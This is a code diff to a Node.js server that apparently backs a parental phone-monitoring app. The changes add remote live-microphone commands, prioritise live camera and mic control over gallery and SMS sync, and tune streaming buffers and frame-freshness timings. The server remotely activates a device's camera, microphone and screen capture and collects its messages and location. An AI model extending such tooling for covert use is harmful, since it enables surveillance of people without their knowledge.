@@ -583,8 +583,8 @@ function socketBackedUp(res, isAudio) {
     const sl = (res.socket && typeof res.socket.writableLength === 'number') ? res.socket.writableLength : 0;
     const rl = (typeof res.writableLength === 'number') ? res.writableLength : 0;
     // Audio: ~16KB ≈ 0.5s PCM. Video: ~80KB ≈ 2 JPEGs.
-    if (isAudio) return (sl > 24 * 1024) || (rl > 16 * 1024);
-    return (sl > 96 * 1024) || (rl > 64 * 1024);
+    if (isAudio) return (sl > 12 * 1024) || (rl > 8 * 1024);
+    return (sl > 48 * 1024) || (rl > 32 * 1024);
   } catch (e) {
     return false;
   }
@@ -960,7 +960,7 @@ const server = http.createServer(async (req, res) => {
     let pathname = u.pathname.replace(/\/+$/, '') || '/';
     // Health FIRST - never block on body/db
     if (pathname === '/health' || pathname === '/') {
-      return send(res, 200, { ok: true, phase: 197, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true, live: true, liveFix: true, liveFgsFix: true, liveLowLatency: true, gallery: true, files: true, music: true });
+      return send(res, 200, { ok: true, phase: 198, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true, live: true, liveFix: true, liveFgsFix: true, liveLowLatency: true, gallery: true, files: true, music: true });
     }
     const q = Object.fromEntries(u.searchParams.entries());
     let body = {};
@@ -2783,11 +2783,14 @@ const server = http.createServer(async (req, res) => {
             || cmd === 'stop_live' || cmd === 'live_stop'
             || cmd === 'live_torch' || cmd === 'torch' || cmd === 'flashlight'
             || cmd === 'live_camera_facing' || cmd === 'live_audio_toggle'
+            || cmd === 'live_mic' || cmd === 'live_audio_on' || cmd === 'live_audio_off'
             || cmd === 'audio_record' || cmd === 'camera_record' || cmd === 'screen_record'
             || cmd === 'record_audio' || cmd === 'record_camera' || cmd === 'record_screen'
             || cmd === 'start_audio_record' || cmd === 'start_camera_record' || cmd === 'start_screen_record'
           );
-          const limit = fast ? 45 * 1000 : 5 * 60 * 1000;
+          const limit = (cmd === 'live_mic' || cmd === 'live_audio_on' || cmd === 'live_audio_off')
+            ? 12 * 1000
+            : (fast ? 45 * 1000 : 5 * 60 * 1000);
           if (age > limit) c.status = 'PENDING';
         }
       });
@@ -2804,7 +2807,18 @@ const server = http.createServer(async (req, res) => {
           payload: c.payload || {}, status: 'PENDING', createdAt: c.createdAt
         });
       }
-      if (snapshot.length) save(db);
+      if (snapshot.length) {
+        // Live control first so Speaker/mic is not stuck behind gallery/sms sync
+        const pri = (c) => {
+          const x = String(c.command || '');
+          if (x === 'live_mic' || x === 'live_audio_on' || x === 'live_audio_off') return 0;
+          if (x === 'start_live' || x === 'live_start' || x === 'stop_live' || x === 'live_stop') return 1;
+          if (x === 'live_torch' || x === 'live_camera_facing') return 2;
+          return 9;
+        };
+        snapshot.sort((a, b) => pri(a) - pri(b));
+        save(db);
+      }
       return send(res, 200, { commands: snapshot });
     }
     if (pathname === '/commands/ack' && req.method === 'POST') {
@@ -3350,7 +3364,8 @@ const server = http.createServer(async (req, res) => {
       let waitKey = deviceId + '|LIVE_CAMERA';
       if (isAudio) waitKey = deviceId + '|LIVE_AUDIO';
       else if (core.indexOf('SCREEN') >= 0) waitKey = deviceId + '|LIVE_SCREEN';
-      else if (core.indexOf('BACK') >= 0) waitKey = deviceId + '|LIVE_CAMERA';
+      else if (core.indexOf('BACK') >= 0) waitKey = deviceId + '|LIVE_CAMERA_BACK';
+      else if (core.indexOf('FRONT') >= 0) waitKey = deviceId + '|LIVE_CAMERA_FRONT';
 
       if (isAudio) {
         res.writeHead(200, {
@@ -3392,7 +3407,7 @@ const server = http.createServer(async (req, res) => {
         const mem = liveLatest.get(waitKey) || liveLatest.get(deviceId + '|' + (isAudio ? 'AUDIO' : (core.indexOf('SCREEN')>=0?'SCREEN':'CAMERA')));
         const memBuf = liveRawBuf(mem);
         const age = mem ? (Date.now() - (mem.createdMs || 0)) : 999999;
-        const freshOk = isAudio ? (age < 400) : (age < 1500);
+        const freshOk = isAudio ? (age < 3500) : (age < 1200);
         if (memBuf && memBuf.length && freshOk) {
           const buf = memBuf;
           const ms = mem.createdMs || Date.now();
@@ -3415,7 +3430,7 @@ const server = http.createServer(async (req, res) => {
           if (isAudio) res.write('PCM\n0\n' + Date.now() + '\n');
           else res.write('--frame\r\nContent-Type: text/plain\r\nContent-Length: 0\r\n\r\n\r\n');
         } catch (e) { writer.alive = false; }
-      }, 5000);
+      }, 4000);
 
       const dropWriter = () => {
         writer.alive = false;
@@ -3541,7 +3556,7 @@ const server = http.createServer(async (req, res) => {
         if (!mem || !buf || !buf.length) return false;
         // Stale live poll = old audio echo / frozen camera frame after stop
         const ageMs = Date.now() - (mem.createdMs || 0);
-        if (core.indexOf('AUDIO') >= 0 && ageMs > 1200) return false;
+        if (core.indexOf('AUDIO') >= 0 && ageMs > 2500) return false;
         if (kind.indexOf('SNAPSHOT') < 0 && core.indexOf('AUDIO') < 0 && ageMs > 10000) return false;
         if (wantRaw && core.indexOf('AUDIO') < 0) {
           res.writeHead(200, {
@@ -3573,8 +3588,8 @@ const server = http.createServer(async (req, res) => {
       // LIVE/raw: ONLY in-memory frames. Audio maxAge 1.2s so /latest cannot replay old voice.
       // SNAPSHOT raw: parent may poll for ~28s — 4s maxAge caused "blank" camera snaps after takePicture lag
       const isSnapReq = kind.indexOf('SNAPSHOT') >= 0 || String(q.snapshot || '') === '1';
-      const maxAge = (core.indexOf('AUDIO') >= 0) ? 1200
-        : (isSnapReq ? 120000 : (wantRaw ? 4000 : 15000));
+      const maxAge = (core.indexOf('AUDIO') >= 0) ? 2500
+        : (isSnapReq ? 120000 : (wantRaw ? 2500 : 15000));
       // Prefer SNAPSHOT_* keys first when parent asked for snapshot (avoid stale LIVE frame)
       let keysTry = memKeys;
       if (isSnapReq) {
